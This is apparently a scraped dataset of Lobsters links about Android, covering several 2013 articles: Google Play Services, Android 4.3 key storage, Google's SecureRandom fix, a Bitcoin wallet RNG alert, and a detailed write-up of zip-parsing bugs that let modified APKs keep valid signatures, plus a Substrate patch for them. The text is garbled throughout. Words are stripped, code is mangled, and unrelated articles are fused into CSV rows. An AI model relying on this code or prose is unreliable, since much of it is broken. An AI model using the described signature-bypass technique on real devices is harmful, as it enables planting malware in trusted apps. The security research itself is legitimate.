releasing cool stuff separately hard part making actually work first reason possible little app finally come age google play service enlarge google play service whatever want calling play service app nt really tell whole story starter insane amount permission basically systemlevel process list nt enough whatever need next actually give permission without user consent play service constantly run background every android phone nearly every google app relies function updatable nt update play store like every app silent automatic update mechanism user control fact time user never even know update happened reason complete absolute power app simple google play service google new platform enlarge happens try living without google play service andrew cunningham looked shortly google io thing truly crystallizing google strategy clear play service systemlevel power updatable part google apps package open source oems allowed modify making completely google control play service basically act shim normal apps installed android o right play service handle google map api google account syncing remote wipe push message play game back end many duty ever question power google play service try disabling nearly every google app device break play service support entire android install base reason permission sneaky update best illustrated chart latest version android six percent device play service roll everyone week two work way back android mean phone three year old newer latest version google play service according google current android statistic percent active device google io google announced slew new apis nearly every android device immediately compatible week play service direct line google core phone really one outside google quite sure powerful get google play service take care lowerlevel apis background service part google fragmentation takedown plan involves play store google multiyear mission decouple every nonsystem app o easy updating play store take quick look google play store account see huge list apps many ship default android gmail map search chrome calendar keyboard youtube even play store separately updatable list good representation current update situation android nearly everything moved main o feature left would require o update thing like hardware support application framework apis apps require certain level security access like lock screen phone setting apps beat software fragmentation update anything without push new android version fewer fewer reason bother calling samsung begging work new update new version android brings nothing lowlevel futureproofing user stop caring update get even interesting consider implication future version android next version android well left android steady continual improvement track allatonce opening floodgate like last saw android seems like google slowly moving path time last three release kept name jelly bean huge monolithic android o update probably extinct may appropriate term package everything major o update mean google get feature user much faster frequently android feature release work like google web app update silent continual improvement happens background device constantly getting better without anything wait third party developer take advantage new apis without wait install base catch lead unified le fragmented healthier android ecosystem
563,Lobsters,android,Android,Credential storage enhancements in Android 4.3,http://nelenkov.blogspot.com/2013/08/credential-storage-enhancements-android-43.html,credential storage enhancement android,previous post android revenge bean enough selinux somewhat recurring topic new api possible api public api api introduction page sdk reference android implementation initially implemented ikeystoreservice hardware hardwarebacked trustzone thales hsms without embedded s uicc security level recent attack marketed found rootkits advanced usage sample project rfc bouncy castle spongy castle sample project sample application vulnerability summary,previous post related android security happened coincide android announcement postrelease dust settled time give proper welcome well minor update nothing groundbreaking revenge bean brings welcome enhancement new apis enough related security even call security release course big star selinux credential storage somewhat recurring topic blog got significant facelift look first post focus mainly newly introduced feature interface might want review previous credential storage post continuing new first foremost system credential store officially named android key store public api storing using appprivate key possible officially supported somewhat clunky preics device next primary owner user could use system key store multiuser compatible user get key finally api even system setting field let check whether credential store hardwarebacked nexus nexus software galaxy nexus core functionality nt changed much since previous release implementation strategy evolved quite bit look briefly lot cover let get started public api api outlined security section new api introduction page detail found official sdk reference review briefly instead introducing yet another androidspecific api key store access exposed via standard jce apis namely keygenerator keystore backed new android jce provider androidkeystoreprovider accessed passing androidkeystore type parameter respective factory method apis actually available well public full sample detailing usage refer basicandroidkeystore project android sdk introduce usage briefly first create keypairgeneratorspec describes key want generate including selfsigned certificate initialize keypairgenerator generate key calling generatekeypair important parameter alias pas keystoregetentry order get handle generated key later currently way specify key size type generated key default bit rsa look like generate key pair context ctx getcontext calendar notbefore calendargetinstance calendar notafter calendargetinstance notafteradd calendaryear keypairgeneratorspec spec new keypairgeneratorspecbuilder ctx setalias setsubject new stringformat cn ou alais ctxgetpackagename setserialnumber bigintegerone setstartdate notbeforegettime setenddate notaftergettime build keypairgenerator kpgenerator keypairgeneratorgetinstance rsa androidkeystore kpgeneratorinitialize spec keypair kp kpgeneratorgeneratekeypair another part app access key keystore keystore keystoregetinstance androidkeystore keystoreload null keystoreprivatekeyentry keyentry keystoreprivatekeyentry keystoregetentry null rsapublickey pubkey rsapublickey keyentrygetcertificate getpublickey rsaprivatekey privkey rsaprivatekey keyentrygetprivatekey device hardwarebacked key store implementation key generated outside android o wo nt directly accessible even system root user implementation software key encrypted peruser keyencryption master key discus key protection detail later android implementation hardwarebacked design initially implemented original jelly bean release new credential storage traditionally since donut day implemented native keystore daemon used local socket ipc interface daemon finally retired replaced real binder service implement ikeystoreservice interface interesting service implemented c somewhat rare android see interface definition detail compared original keymasterbased implementation ikeystoreservice get new operation getmtime duplicate ishardwarebacked clearuid expected getmtime return key modification time duplicate copy key blob used internally key migration ishardwarebacked query underlying keymaster implementation return true hardwarebacked last new operation clearuid bit interesting mentioned key store support multiuser device user get set key stored datamisckeystoreusern n android user id key name alias mapped filename owner app uid reflects android user id well app owns key storemanaged key uninstalled user key created user deleted app completely removed system key deleted user since key access tied app uid prevents different app happens get uid accessing uninstalled app key key store reset deletes key file master key also affect current user key file primary user might look like actual file owned keystore service run keystore linux user check calling uid decide whether grant deny access key file key protected hardware key file may contain reference actual key deleting may destroy underlying key therefore delkey operation optional may implemented hardware hardwarebacked give perspective whole hardwarebacked idea let briefly discus implemented nexus may nexus based qualcomm snapdragon pro soc like recent arm soc trustzoneenabled qualcomm implement secure execution environment qsee top detail usual quite scarce trusted application separated main o way interact controlled interface devqseecom device provides android application wish interact qsee load proprietary libqseecomapiso library use function provides send command qsee see qseecom communication api quite lowlevel basically allows exchanging binary blob typically command reply whose content entirely depends secure app communicating case nexus keymaster used command generatekeypair importkeypair signdata verifydata keymaster implementation merely creates command structure sends via qseecom api par reply contain cryptographic code interesting detail qsee keystore trusted app may dedicated app part general purpose trusted application nt return simple reference protected key instead us proprietary encrypted key blob unlike ncipher thales hsms model thing actually protected hardware form master keyencryption key kek usergenerated key indirectly protected encrypted kek allows practically unlimited number protected key disadvantage kek compromised externally stored key blob compromised well course actual implementation might generate dedicated kek key blob created key fused hardware either way detail available qualcomm keymaster key blob defined aosp code shown suggest private exponent encrypted using aes probably cbc mode added check encrypted data integrity might encrypted android key store master key stored disk define kmmagicnum kmkb key master key blob hex define kmkeysizemax bit define kmivlength cbc iv define kmhmaclength used hmac struct qcomkmkeyblob magicnum versionnum modulus kmkeysizemax modulussize publicexponent kmkeysizemax publicexponentsize iv kmivlength encryptedprivateexponent kmkeysizemax encryptedprivateexponentsize hmac kmhmaclength case nexus hardware simply arm soc implementation possible theoretically hardwarebacked keymaster implementation need based trustzone dedicated device generate store key securely used usual suspect embedded secure element se tpms however mainstream android device dedicated tpms recent flagship device began shipping without embedded s probably due carrier pressure price hardly factor since embedded s usually package nfc controller course mobile device form uicc sim card typically generate store key use well android still nt standard api access uicc even though vendor firmware often include one one could theoretically implement uiccbased keymaster module compatible uicc friendly neighbourhood mno likely happen security level secure brand new hardwarebacked key answer usual depends stored real dedicated tamperresistant hardware module embedded se secure se since technology around year even recent attack effective s using weak encryption algorithm mean fairly secure course mentioned previous section current keymaster implementation use actual s hope trustzone aggressively marketed mobile security silver bullet streaming medium company embraced endtoend drm solution really deliver arm trustzone architecture might sound core end trusted application software run slightly lower level android readily reverse engineered course vulnerability found since run within secure world effectively access everything device including trusted application exploited could lead effective hard discover rootkits sum trustzone secure application might provide effective protection android malware running device given physical access well trustzone kernel exploitable applied android key store mean exploitable vulnerability underlying trusted application keymaster module depends keyencryption key could extracted hardwarebacked key could compromised advanced usage mentioned first section android offer well defined public api system key store sufficient use case needed connect keystore service directly always really recommended part android sdk ikeystoreservice nt wrapper manager class want get handle need get one directly servicemanager hidden sdk apps usual use reflection matter calling interface method need see sample project github course calling uid nt necessary permission access denied operation available apps class smclass classforname androidosservicemanager method getservice smclassgetmethod getservice stringclass ibinder binder ibinder getserviceinvoke null androidsecuritykeystore ikeystoreservice keystore ikeystoreservicestubasinterface binder using ikeystoreservice directly store symmetric key secret data system key store using put method current javasecuritykeystore implementation allow store privatekey data encrypted key store master key even system key store hardwarebacked data protected hardware way accessing hidden service way augment system key store functionality since sign operation implement raw signature operation rfc key storemanaged including hardwarebacked key used implement signature algorithm natively supported android nt need use ikeystoreservice interface operation available standard jce cipher interface keystore k keystoregetinstance androidkeystore ksload null keystoreentry keyentry keystoregetentry null rsaprivtekey privkey rsaprivatekey keyentrygetprivatekey cipher c ciphergetinstance rsaecbnopadding cipherinit cipherencryptmode privatekey byte result cipherdofinal inlength use primitive implement example bouncy castle asymmetricblockcipher interface use signature algorithm available bouncy castle lightweight api actually use spongy castle stay compatible android without much hastle example want use modern provably secure signature algorithm android default pkcs implementation rsapss accomplish something like see sample project androidrsaengine androidrsaengine rsa new androidrsaengine true digest digest new digest new psssigner signer new psssigner rsa digest rsakeyparameters params new rsakeyparameters false pubkeygetmodulus pubkeygetpublicexponent signerinit true params signerupdate signeddata signeddatalength byte signature signergeneratesignature likewise need implement rsa key exchange easily make use oaep padding like androidrsaengine rsa new androidrsaengine false digest digest new digest new oaepencoding oaep new oaepencoding rsa digest null oaepinit true null byte ciphertext oaepprocessblock plainbytes plainbyteslength sample application show tie apis together feature elegant fully holocompatible user interface added benefit using hardwarebacked key since generated using android default securerandom implementation affected recently announced securerandom vulnerability course since implementation closed hope trusted apps rng actually work however bouncy castle ps oaep implementation use securerandom internally might want seed prng manually starting app make sure nt start prng state apps keystore daemonservice us devurandom directly source randomness generating master key used key file encryption affected rsa key generated softkeymaster opensslbased software implementation might affected openssl us randbytes generate prime probably ok since keystore daemonservice run dedicated process openssl prng automatically seed devurandom first access unfortunately official detail insecure securerandom problem ca nt certain summary android offer standard sdk api generating accessing appprivate rsa key make easier nonsystem apps store key securely without implementing key protection new jelly bean also offer hardwarebacked key storage supported device guarantee even system root apps extract key protection physical access attack depends implementation current implementation trustzonebased lowlevel rsa operation key store managed key also possible enables apps use cryptographic algorithm provided android builtin jce provider
564,Lobsters,android,Android,Some SecureRandom Thoughts,http://android-developers.blogspot.com/2013/08/some-securerandom-thoughts.html,securerandom thought,update multiple bitcoin application update,posted alex klyubin android security engineer android security team investigating root cause compromise bitcoin transaction led update multiple bitcoin application august determined application use java cryptography architecture jca key generation signing random number generation may receive cryptographically strong value android device due improper initialization underlying prng application directly invoke systemprovided openssl prng without explicit initialization android also affected application establish tlsssl connection using httpclient javanet class affected class seed openssl prng value devurandom developer use jca key generation signing random number generation update application explicitly initialize prng entropy devurandom devrandom suggested implementation provided end blog post also developer evaluate whether regenerate cryptographic key random value previously generated using jca apis securerandom keygenerator keypairgenerator keyagreement signature addition developer recommendation android developed patch ensure android openssl prng initialized correctly patch provided oha partner checked android tree application run exclusively android kitkat need take special action work around bug would like thank soo hyeon kim daewan han etri dong hoon lee korea university notified google improper initialization openssl prng update original code sample crashed small fraction android device due devurandom writable updated code sample handle case gracefully software provided asis without express implied warranty event google held liable damage arising use software permission granted anyone use software purpose including commercial application alter redistribute freely long origin misrepresented import androidosbuild import androidosprocess import androidutillog import javaiobytearrayoutputstream import javaiodatainputstream import javaiodataoutputstream import javaiofile import javaiofileinputstream import javaiofileoutputstream import javaioioexception import javaiooutputstream import javaiounsupportedencodingexception import javasecuritynosuchalgorithmexception import javasecurityprovider import javasecuritysecurerandom import javasecuritysecurerandomspi import javasecuritysecurity fix output default prng low entropy fix need applied via link apply use java cryptography architecture primitive good place invoke application code oncreate public final class prngfixes private static final int versioncodejellybean private static final int private static final byte buildfingerprintanddeviceserial getbuildfingerprintanddeviceserial hidden constructor prevent instantiation private prngfixes applies fix throw securityexception fix needed could applied public static void apply applyopensslfix installlinuxprngsecurerandom applies fix openssl prng low entropy nothing fix needed throw securityexception fix needed could applied private static void applyopensslfix throw securityexception buildversionsdkint versioncodejellybean buildversionsdkint need apply fix return try mix device invocationspecific seed classforname orgapacheharmonyxnetproviderjssenativecrypto getmethod randseed byte class invoke null generateseed mix output linux prng openssl prng int bytesread integer classforname orgapacheharmonyxnetproviderjssenativecrypto getmethod randloadfile stringclass longclass invoke null devurandom bytesread throw new ioexception unexpected number byte read linux prng bytesread catch exception e throw new securityexception failed seed openssl prng e installs linux prngbacked code securerandom implementation default nothing implementation already default need install implementation throw securityexception fix needed could applied private static void installlinuxprngsecurerandom throw securityexception buildversionsdkint need apply fix return install linux prngbased securerandom implementation default yet installed provider securerandomproviders securitygetproviders securerandomproviders null securerandomproviderslength linuxprngsecurerandomproviderclassequals securerandomproviders getclass securityinsertproviderat new linuxprngsecurerandomprovider assert new securerandom securerandomgetinstance return securerandom backed linux prngbased securerandom implementation securerandom new securerandom linuxprngsecurerandomproviderclassequals getclass throw new securityexception new securerandom backed wrong provider getclass securerandom try securerandomgetinstance catch nosuchalgorithmexception e throw new securityexception available e linuxprngsecurerandomproviderclassequals getclass throw new securityexception securerandomgetinstance backed wrong provider getclass code provider code securerandom engine pas request linux prng private static class linuxprngsecurerandomprovider extends provider public linuxprngsecurerandomprovider super linuxprng linuxspecific random number provider us devurandom although devurandom prng apps explicitly request securerandom thus need prevent getting default implementation whose output may low entropy put linuxprngsecurerandomclassgetname put implementedin software link securerandomspi pass request linux prng code devurandom public static class linuxprngsecurerandom extends securerandomspi implementation note request generate byte mix seed passed linux prng devurandom instance class seed mixing current time pid uid build fingerprint hardware serial number available linux prng concurrency read request underlying linux prng serialized slock ensure multiple thread get duplicated prng output private static final file urandomfile new file devurandom private static final object slock new object input stream reading linux prng code null yet opened guardedby slock private static datainputstream surandomin output stream writing linux prng code null yet opened guardedby slock private static outputstream surandomout whether engine instance seeded needed instance need seed client explicitly seed private boolean mseeded override protected void enginesetseed byte byte try outputstream synchronized slock geturandomoutputstream outwrite byte outflush catch ioexception e small fraction device devurandom writable log ignore logw prngfixesclassgetsimplename failed mix seed urandomfile finally mseeded true override protected void enginenextbytes byte byte mseeded mix device invocationspecific seed enginesetseed generateseed try datainputstream synchronized slock geturandominputstream synchronized inreadfully byte catch ioexception e throw new securityexception failed read urandomfile e override protected byte enginegenerateseed int size byte seed new byte size enginenextbytes seed return seed private datainputstream geturandominputstream synchronized slock surandomin null note consider inserting bufferedinputstream datainputstream fileinputstream need higher prng output performance live future prng output pulled process prematurely try surandomin new datainputstream new fileinputstream urandomfile catch ioexception e throw new securityexception failed open urandomfile reading e return surandomin private outputstream geturandomoutputstream throw ioexception synchronized slock surandomout null surandomout new fileoutputstream urandomfile return surandomout generates device invocationspecific seed mixed linux prng private static byte generateseed try bytearrayoutputstream seedbuffer new bytearrayoutputstream dataoutputstream seedbufferout new dataoutputstream seedbuffer seedbufferoutwritelong systemcurrenttimemillis seedbufferoutwritelong systemnanotime seedbufferoutwriteint processmypid seedbufferoutwriteint processmyuid seedbufferoutwrite buildfingerprintanddeviceserial seedbufferoutclose return seedbuffertobytearray catch ioexception e throw new securityexception failed generate seed e get hardware serial number device return serial number code null available private static string getdeviceserialnumber using reflection api buildserial available since api level gingerbread android try return string buildclassgetfield serial get null catch exception ignored return null private static byte getbuildfingerprintanddeviceserial stringbuilder result new stringbuilder string fingerprint buildfingerprint fingerprint null resultappend fingerprint string serial getdeviceserialnumber serial null resultappend serial try return resulttostring getbytes catch unsupportedencodingexception e throw new runtimeexception encoding supported
565,Lobsters,android,Android,Android RNG Weakness Renders Bitcoin Wallets Insecure,http://bitcoin.org/en/alert/2013-08-11-android,android rng weakness render bitcoin wallet insecure,happened critical weakness bitcoin wallet blockchaininfo bitcoinspinner mycelium wallet done bitcoin wallet google play google code bitcoinspinner google play google code mycelium bitcoin wallet google play myceliumcom blockchaininfo google play,happened recently learned component android responsible generating secure random number contains critical weakness render android wallet generated date vulnerable theft problem lie android problem affect wallet generated android app incomplete list would bitcoin wallet blockchaininfo wallet bitcoinspinner mycelium wallet apps nt control private key affected example exchange frontends like coinbase mt gox apps impacted issue private key generated android phone done update prepared following wallet apps bitcoin wallet update installed google play google code key rotation occur automatically soon upgrade old address marked insecure address book need make fresh backup bitcoinspinner update installed google play google code startup advise proceed mycelium bitcoin wallet update installed google play myceliumcom wizard guide process moving bitcoins newly generated address put old key archive mode blockchaininfo update installed google play version includes automatic rekeying wizard simply update latest version follow onscreen instruction please make fresh wallet backup process completes order resecure existing wallet key rotation necessary involves generating new address repaired random number generator sending money wallet back use android wallet strongly recommend upgrade latest version available play store soon one becomes available wallet rotated need contact anyone stored address generated phone give new one ca nt update android app alternatively send bitcoins bitcoin wallet computer android app updated make sure send back bitcoins old insecure address notice last updated tue aug utc
566,Lobsters,android,Android,Android AOSP Leader Quits Over Binary GPU Drivers,https://plus.google.com/112218872649456413744/posts/9HHRURorE7g,android aosp leader quits binary gpu driver,one account google sign google account,one account google sign google account
567,Lobsters,android,Android,Android Bug Superior to Master Key,http://www.saurik.com/id/18,android bug superior master key,android bug superior master key bluebox security techcrunch la time previous article patch article covered english cydia impactor negative extra data previous article two complement datainputstream overlapping content serious limitation anatomy another android hole chinese researcher claim new code verification bypass second master key style apk exploit revealed two day original go public already patched google proofofconcept said twitter previous article indicated extreme offset previous master key article central directory writeup clamped extra data simple technique advanced interleaving skipping entry historical look patch introduces bug test case fixing bug article posted day ago rekey substrate extension website randomaccessfile mshookmethod bufferedinputstream view repository online gitweb instance hookjava complete signature bypass,android bug superior master keyearlier year bluebox security announced vulnerability way android application package signed allowing content package code modified potentially introduce malware without invalidating signature placed package original developerthis bug disclosed blackhat due large amount attention given community rapidly found internally security circle well blog forum point bug fully public patch deployed cyanogenmod open distribution androidthis bug became known press master key due let effectively sign code using key developer bug covered everything techcrunch la timesin previous article documented bug detail provided method exploit vulnerability would work across device without need either luck skill satisfy particular requirement original application package contain file optional include attention focussed master key patch hit android open source project area became clear could used similar way article posted android security squad 安卓安全小分队 detailing exploit covered english honlinelater article written bug examining exploit technique coming conclusion vulnerability offered le ability master key exploit due narrow unlikely requirement original signed application package must satisfyin article document different exploit technique bug limit fact second exploit described provides much capability master key exploit allowing arbitrarily complex package take signature arbitrary signed package finally look history bug android showing introduceda concrete implementation technique available use getting system access vulnerable device part cydia impactor tool working managing device utilizing exploit autodetects two bug exploitable choosing one use exploitnegative extra databefore explaining new technique quickly explain existing one make limitation clear assume familiarity previous master key exploit based idea android multiple implementation unzip one java used verify signature one c used extract file previous article document bug exploit detailin case newer exploit look local header placed file contain metadata file information stored name file possibly compressed content file additionally variablelength extra field allowing file format extension header name extra data underlying mistake code many value zip file read signed number instead unsigned number due way two complement number formatted cause field value greater wrap become negative would reason happened developer working code used datainputstream parse file calling readshort method get number return short java language integer type signed code pull length extra datadatainputstream new datainputstream rafstrm int localextralenorwhatever shortreversebytes isreadshort way always make change code snippet post removing irrelevant logic eliding obvious type cast adjusting formatting never change actual identifier token localextralenorwhatever seriously name variable given someone google overlapping contentto calculate file compressed data begin code take location header add length filename extra area extra area length negative checked resulting value addition subtraction calculation data begin readwith offset negative cause offset back header conflicting data exploit documented android security squad actually quite ingenious based lucky coincidence format key file android package classesdex begin dex exploit set length extra field java read move beginning file data three character back filename happens still valid dex file classesdex end beginning file dex file stored uncompressed valida modified version file placed byte end filename long original file larger fit space header modified payload following ascii diagram show correct view c top java overlapping view c header name extra data java header name extra data serious limitationsas seen exploit technique numerous requirement make difficult use random file writeup sophos security company popular antivirus product called anatomy another android hole chinese researcher claim new code verification bypass detailed limitationsas result extra field flaw generic master key bug particular apk hacked way must start classesdex fit byte decompressed narrow thing bit small mercy apk file extracted personal android device example ineligible attack flawa week earlier similar description provided android police article entitled second master key style apk exploit revealed two day original go public already patched googlefortunately limitation attack begin unlike master key exploit one replace single file classesdex original smaller process construct modified apk precise relies fairly complete knowledge structure filespau oliva developer proofofconcept bug said twitter difficult find apks containing classesdex signed platform key previous article people concentrated classesdex go find classesdex later indicated find one motorolathese difficulty however one one seems mention size resulting file encoded local file header original file replacement file size putting irritating limit construction payload padding internal structuredespite limitation bug continues tempting found much later device patched bug almost none patched bug android police sophos mentioned high likelihood delay getting patchedthere unfortunate news since fix appears pretty new unlikely propagated device wild yet including nexus device google play edition variant samsung galaxy htc oneof course google recently announced seven day achievable timeframe responding vulnerability report day accepted although google indeed responded quickly patching hole commended efficiency nt get fix wider world remains seen hard mountain view lean many handset licensee push firmware update extra field master key flaw since go heart application verification android platformextreme offsetthe first new technique present involves generalizing exploit work file classesdex way using much longer negative offset pushing content file past beginning local file header requirement local file header leave gap c header name extra data padding java header name extra data without prefix overlap requirement even cost shrinking size limit bug becomes much easier use particular allows u use dalvik debugger technique documented previous master key article replaces androidmanifestxml file small contained every packagethat said attack described using debugger useful attacking device outside via usb cable debugger accessible application device scary malware threat model involves replacing file especially code whether classesdex jni library event technique still limited master key replace file still replace file previously existed gained added limitation file larger replacement file length original copycentral directoryhowever better looking original patch google reader might note two place extra length field read made mistake signed integer people concentrating one actually much interestingto examine second mistake need turn attention different part zip file format central directory index zip file parser use rapidly find file stored zip archive located end file central directory entry point local file area detail local name comment extra detail local name comment extra magic magic number start find comment scan eof incidentally way zip file parser find header using end central directory record follows point start index even record however must found scanning backwards file variablelength comment stored end filethis interesting google also us zip file store overtheair firmware update us wholefile signature scheme protect store signature inside comment end file comment avoid scan file google stored size signature afterwardshowever used offtheshelf implementation zip access content one could lie size signature claiming larger store second tiny zip file allowing one take signed firmware update replace content fashion similar newer bug motorola droid rooted information recommend writeup index also store extra data look c zip file library android see move next field take offset current entry add length directory entry length three variable length field name comment extra unsigned valuesunsigned int filenamelen extralen commentlen hash filenamelen ptr kcdenamelen extralen ptr kcdeextralen commentlen ptr kcdecommentlen hash computehash ptr kcdelen filenamelen addtohash ptr kcdelen filenamelen hash ptr kcdelen filenamelen extralen commentlen clamped extra datathen looking java code see using readshort pulling signed value storing signed integer however unlike earlier code parsed local file header parsing central directory negative extra data length simply considered invalid get skippednamelength itreadshort int extralength itreadshort int commentlength itreadshort byte namebytes new byte namelength streamsreadfully namebytes namebyteslength name new string namebytes namebyteslength commentlength byte commentbytes new byte commentlength streamsreadfully commentbytes commentlength comment new string commentbytes commentbyteslength extralength extra new byte extralength streamsreadfully extra extralength mean longer worry awkward behavior moving backwards file encode large enough value c code honor java code clamp give u opportunity cause java c parser view file two different way without painthe limitation number entry index stored end index read parser processing file one us loop pull exactly many file c java version central directory must number entriessimple techniquesto demonstrate modification file going use ascii art diagram diagram box represent entry central directory name field presumed stored inside box arrow showing movement caused extra data length fieldson left correct interpretation c logic right java see file entry also either forward slash backward slash x representing see file backward slash leaning left c forward slash leaning right java x two slash boththe first technique look simplest taking final entry list splitting two separate record one c java setting extra data length field large enough number java ignore java par central directory inside c view extra c java x pad eof technique expanded work multiple entry large amount space central directory entry byte plus length filename continue chain normally merging two entirely different zip file together sharing single common file c java x pad eof advanced interleavingfor completeness look large number file total length filename original zip file plus byte header file add greater extra data skipped c parser solution interleave indexesone way handle resynchronize back shared file long record java see longer record c see offset exactly boundary get clamped cause java use extra data skip slightly le difference filename c java x long name pad short name x still somewhat irritating though put horrible restriction length filename zip file group item together set four two java two c solved pushing item seen java sufficiently far apart divide area skipped c c java x pad pad pad pad pad pad x spending lot time building ascii diagram one might realize soon enough also using variable length comment field accomplish effect previous example single pair record space divided comment extra data length c java x pad pad pad x using comment field well allows u much simpler form interleaving require resynchronization use first record fork two central directory play leapfrog two list record skip corresponding record seen implementation c java x pad pad pad pad size next size next size next size next skipping entrieswe still left two limitation share first file two list number file version central directory additionally course java version index exactly file original file one signed might tempting attempt rely trick based previous bug addition making bug feel subordinate bug fixed number device second bug still viable thereby use duplicate filename solve problem zip parser reject themthankfully turn kind entry added zip file ignored purpose signature verification content sign directory entry also property different implementation bother others nt ca nt enforced enumeration jarentry entry jarfileentries entrieshasmoreelements final jarentry je entriesnextelement jeisdirectory continue final string name jegetname namestartswith metainf continue final certificate localcerts loadcertificates jarfile je readbuffer creating directory entry really easy one add slash end filename code also skip file metainf folder file used part signature verification system directory entry superior examined using metainf folder hide file public boolean isdirectory return namecharat namelength historical lookwhile testing implementation exploit android found work older version android correctly determined file signature compromised intrigued went history libcore determined bug introduced google design decision android going obtain standard library rather using gnu classpath went apache harmony largely understand due licensing difference apache harmony since retired google maintains fork androidit turn originally harmony implementation zipfile actually written c c code constructed zipentry via jni passing data layer apparently involved large buffer copy used much memory android mobile platform google rewrote zipfile javathis original implementation java version zipfile bug carefully dealt sign extension fact developer wrote written implementation reader specifically unsigned littleendian value providing readshortle returning int readintle returning long however calling reader every field central directory header must read even single small file zip file extracted considered sufficiently slow replaced logic reading header single pas correctly bit math parsing seeing performance issue call readshortle readintle going read entire header parse result without using function call uglier much faster note line look bit different corresponding field local long need avoid problem induced sign extension namelen hdrbuf hdrbuf int extralen hdrbuf hdrbuf int commentlen hdrbuf hdrbuf original contribution google harmony made harmony began shutting project became hosted entirely google purpose android thereby find patch harmony bug tracker attachment issue resulting discussiona year later late project transitioned scour google repository find patch introduces bug patch made fix android bug apparently signextension bug crcs top bit set got description comment associated test case code quite hairy use intlong ca nt change field int seem use mean unset still allowing whole int range value including look zip specification see whether right let avoid sign extension know patch actually added sign extension issue p also believe misunderstanding code using int long first place field int actually storing number long whole int range value usedfixing bughow much threat bug normal user still question people avail larger application distribution channel google play store supposedly centrally scan vulnerability catalog make certain spreading malwarehowever article posted day ago symantec document multiple finding wild original master key exploit used developer china distribute malware various alternative market provide screenshots application information code doeswe discovered four additional android application infected attacker distributed thirdparty app site apps popular news app arcade game card game betting lottery app apps designed chinese language usersit therefore understandable people would rather protected local fix additionally consider irresponsible detail exploit like without providing mitigation possible hotfix user apply finally think showing thing fixed explains everything worksin previous article recommended user turn thirdparties productionlevel fix nothing else yet provide patch second set bug however addition previous caveat researching second article determined rekey primary recommendation actually fix bug website clear providing complete fix bug thankfully point user want fix directly backport name project placed fix ostensibly backported later version android real goal however article describe fix workswithin minute publishing article contacted collin mulliner one developer rekey telling finished publishing new version rekey published article far tell still protect imagine update later today cover bug entirety assuming case rekey become primary recommendation user protect bug user might give time substrate extensionto go fixing bug existing device use substrate code modification platform provide io android developer wanting learn substrate go website fairly complete api documentation boilerplate though quite simplepublic class hook public static void initialize first hook need fix code read local file header contained method called getinputstream take zipentry return inputstream read content goal verify field read call original implementation allow read filenote carefully approach replace content method entirely alternative hookbased attempt fix bug done performing replacement instead patch hook break behavior others may layering onto class critical avoid hooksto get access file header data use mraf field zipfile randomaccessfile class already export useful method like readshort access must synchronized user first seek place interest scan file changing state verify patched fieldsto replace content method use substrate mshookmethod allows u redirect implementation method api take functor object called invoked code provide use invoke call previous implementation argument boxed arrayfor actual verification reject zip file signed bit incorrectly parsed field previous version android would failed parse package correctly little loss remove make obvious new zip file would fail older device value reading little endian bit must checked using value rather field raf zipfileclass getdeclaredfield mraf rafsetaccessible true final field local zipentryclass getdeclaredfield mlocalheaderreloffset localsetaccessible true method getinputstream zipfileclass getdeclaredmethod getinputstream zipentryclass mshookmethod zipfileclass getinputstream new msmethodalteration zipfile inputstream public inputstream invoked zipfile thiz object args throw throwable zipentry entry zipentry args randomaccessfile raf randomaccessfile rafget thiz synchronized raf rafseek localgetlong entry rafskipbytes rafreadshort throw new zipexception rafskipbytes rafreadshort throw new zipexception return invoke thiz args second hook zipentry constructor read central directory moving file pointer forward location next header process method take two argument byte array used store content header old optimization inputstream pointing locationas class purpose store information header nt matter temporarily invalid therefore verify file safe executed allows u use content header buffer keep messing position inputstream passedit happens inputstream instance passed method instance bufferedinputstream guarantee implementation mark reset could used scan forward verify rewind back top header would let u verify call methodhowever would rely underlying type inputstream sane assumption making even happens true people might modify behavior class implementation might change type signature however changed contractthe field verify come chunk use loop make code slightly shorter explicitly noted code verify value time date field field almost always overflow thankfully really data affect file read verifiedconstructor init zipentryclass getdeclaredconstructor byte class inputstreamclass mshookmethod zipentryclass init new msmethodalteration zipentry void public void invoked zipentry thiz object args throw throwable byte header byte args invoke thiz args datainputstream new datainputstream new bytearrayinputstream header inskip int inreadshort throw new zipexception inskip int inreadshort throw new zipexception return null complete source code extension clone git repository git gitsaurikcombackportgit view repository online using gitweb instance use direct link hookjava user want install apk get cydia gallery inside substrate complete signature bypasswe ability construct zip file two central directory central directory start file file directory entry zip file number file shorter one filled directory entry match larger oneotherwise two central directory entirely separate totally unrelated filename point totally unrelated entry aforementioned local data area zip file mean effectively merge two zip file together arbitrary complexity contentsthis hope clear much powerful wellknown master key vulnerability comparison previous bug allowed u replace content file present original signed zip could example add classesdex one previously nt existthe master key bug however slightly easier implement demonstrated using zip sed previous article support android thereby likely continue used time come however application normally contain many file form resource truly masquerade package stolen signature requires new powerful exploit
568,Lobsters,android,Android,"Exploit (& Fix) Android ""Master Key""",http://www.saurik.com/id/17,exploit fix android master key,exploit fix android master key bluebox security mac o x window background information android one root uncovering android master key make device vulnerable techcrunch la time play store safety vulnerability allows attacker modify android apps without breaking signature android code signing bypassed responsible disclosure finding bug ice cream sandwich native code support suck ctz comment patch android bug security bug remove support duplicate file entry apk verification great android security hole linkedhashmap packageparser replacing dalvik bytecode jarfile optimized dex file info android bug replacing native library nativelibraryhelper zipfilerocpp replacing androidmanifestxml research exactly modified packageparser forwardlocked public file packagehelper packagemanagerservice investigating assetmanager assetmanagerjava assetmanagercpp compiling androidmanifest hacking apk quick dirty poc android bug apk generator huge hole android android debuggable runas runas android debuggable jdb debugger messagequeue looper one server automated exploit java debug wire protocol cydia substrate mac o x window obtaining root exploiting bug google glass one server checking vulnerability scan device android master key vulnerability srt appscanner rekey tool detect bluebox exploit xray patching bug article cio recent thread xda developer forum v substrate rekey substrate extension patch cyanogenmod substrate api documentation website article article hookmethod functionality view repository online gitweb instance hookjava final takeaway,exploit fix android master key earlier year bluebox security announced found bug android could used modify content application package including one distributed part system software without affecting attached cryptographic signature detail disclosed black hat usa enough detail disclosed abstract talk others able find bug later patch applied popular opensource android rom cyanogenmod making issue public obvious proofofconcepts bug might used concrete formin article describe different approach exploitation bug fall prey limitation previous description specifically package attacked need existing classesdex file inside actually common production device technique simple enough performed hand article walk user process allowing full understanding exploit performed however automated tool called impactor also introduced capable performing process virtually android devicefinally detail underlying bug behind exploit patched using cydia substrate code modification framework provided along concrete implementation installed device supported substrate process overview existing work area providedmany people reading article learn use cydia impactor exploit device download link mac o x window article includes instruction using localprop obtaining root work approximately android including glass google tvbackground informationa month ago schedule yearly black hat usa conference posted catchy title powerful abstract one talk particular caught eye many people browsing conference android one root abstract follows discussing undisclosed 